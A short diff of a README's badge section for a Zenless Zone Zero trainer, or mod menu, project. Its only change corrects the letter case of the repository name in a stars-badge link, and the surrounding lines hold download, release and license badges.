@@ -3,7 +3,7 @@
 [![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/ZZZ-trainer/releases/download/v1.2/ZZZ.Mod.Menu-v1.2.zip)
 [![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/rivetqueenrivet/ZZZ-trainer/releases/download/v1.2/ZZZ.Mod.Menu-v1.2.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/rivetqueenrivet/zzz-trainer?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/zzz-trainer/stargazers)
+[![Stars](https://img.shields.io/github/stars/rivetqueenrivet/ZZZ-trainer?style=for-the-badge&logo=github)](https://github.com/rivetqueenrivet/ZZZ-trainer/stargazers)
 
 
 A powerful trainer tool for Zenless Zone Zero with clean in-game overlay
